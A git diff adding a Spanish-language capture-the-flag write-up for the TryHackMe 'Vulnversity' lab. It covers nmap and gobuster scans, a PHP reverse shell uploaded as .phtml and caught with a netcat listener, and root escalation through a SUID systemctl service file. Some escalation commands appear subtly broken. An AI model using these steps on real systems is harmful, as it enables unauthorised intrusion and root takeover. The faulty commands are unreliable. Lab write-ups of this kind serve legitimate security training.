@@ -4,7 +4,7 @@ share: false
 excerpt: "El mejor metodo de aprendizaje es practicando"
 share: false
 header:
-  teaser:  /assets/images/vulnversity/logo.jpg
+  teaser:  /assets/images/vulnversity/logo.jpeg
   teaser_home_page: true
 categories:
   - tryhackme
@@ -37,6 +37,9 @@ Comprovamos que *OS* tiene la maquia antes de iniciar
 
 10.10.249.39 (ttl -> 63): Linux
 ```
+
+
+### Reconnaissance 
 
 Iniciamos haciendo un primer escaneo con _nmap_
 
@@ -113,3 +116,147 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 30.84 seconds
 ```
+(Vamos respondiendo las preguntas de la maquina)
+> How many ports will nmap scan if the flag -p-400 was used?
+> 400
+
+> Using the nmap flag -n what will it not resolve?
+> DNS
+
+> What is the most likely operating system this machine is running?
+> Ubuntu
+
+> What port is the web server running on?
+> 3333 
+
+
+### Locating directories using GoBuster 
+
+En esta fase utilizaremos Gobuster para ver posibles _urls_ existentes
+
+> What is the directory that has an upload form page?
+>  /internal/
+
+
+```bash
+> gobuster dir -u http://10.10.1.188:3333 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
+
+===============================================================
+2021/11/10 09:37:40 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 292]
+/.htpasswd            (Status: 403) [Size: 297]
+/.htaccess            (Status: 403) [Size: 297]
+/css                  (Status: 301) [Size: 315] [--> http://10.10.1.188:3333/css/]
+/fonts                (Status: 301) [Size: 317] [--> http://10.10.1.188:3333/fonts/]
+/images               (Status: 301) [Size: 318] [--> http://10.10.1.188:3333/images/]
+/index.html           (Status: 200) [Size: 33014]                                    
+/internal             (Status: 301) [Size: 320] [--> http://10.10.1.188:3333/internal/]
+/js                   (Status: 301) [Size: 314] [--> http://10.10.1.188:3333/js/]      
+/server-status        (Status: 403) [Size: 301]                                        
+                                                                                       
+===============================================================
+2021/11/10 09:39:13 Finished
+===============================================================
+```
+entramos en la ruta que encontramos con el anterior escaneo _http://10.10.1.188:3333/internal/_ y encontramos que podemos subir
+un archivo en la maquina, probaremos obtener una _shell_ mediante php
+
+para ello, modificaremos [esta](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) _shell_ de php
+
+[cargar shell](/assets/images/vulnversity/server.png)
+
+### Compromise the webserver 
+
+En esta parte podemos hacerlo de varios metodos, pero seguiremos la maquina y utilizaremos *burp suite*
+
+
+> Run this attack, what extension is allowed?
+> .phtml
+
+[shell en el servidor](/assets/images/vulnversity/shell.png)
+
+ponemos nuestra maquina en escucha
+
+```bash
+❯ nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.9.0.237] from (UNKNOWN) [10.10.1.188] 57880
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 09:55:03 up 39 min,  0 users,  load average: 0.00, 0.00, 0.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+- Estamos dentro de la maquina, ahora a buscar la flag 1
+
+
+> What is the name of the user who manages the webserver?
+> bill
+
+```bash
+$ cat user.txt
+8xx7x92xbexax6xa22x63x6x00xcfxexb
+```
+
+> What is the user flag?
+> 8xdx99xxxfexaxadxxa6x36x1x0xcxcxxb
+
+### Privilege Escalation 
+
+la maquina nos da una ayuda, utilidar el comando *find / -user root -perm -4000 -exec ls -ldb {} \;*, sin embargo,
+tambien es valido utilizar *find / -perm -u=s -type f 2>/dev/null* 
+
+```bash
+$ find / -perm -u=s -type f 2>/dev/null               
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/ping
+/bin/fusermount
+/sbin/mount.cifs
+```
+
+> On the system, search for all SUID files. What file stands out?
+> /bin/systemctl
+
+Podemos observar que entre los binarios se encuentra systemctl, por lo cual vamos a utilizarlo para obtener privilegios root, con 
+los siguientes comandos.
+
+1. Primero, creamos el archivo para la conexion de shell inversa
+1. creamos un servicio y lo ejecutamos con _systemcl_
+
+```bash
+$ TF=$(mktemp).service
+$ echo '[Service]
+> ExecStart=/bin/sh -c "cp /root/root.txt > /tmp/output.txt"
+> WantedBy=multi-user.target' > $TF
+
+/bin/systemctl link $TF
+/bin/systemctl enable-now $TF
+```
+> Become root and get the last flag (/root/root.txt)
+>
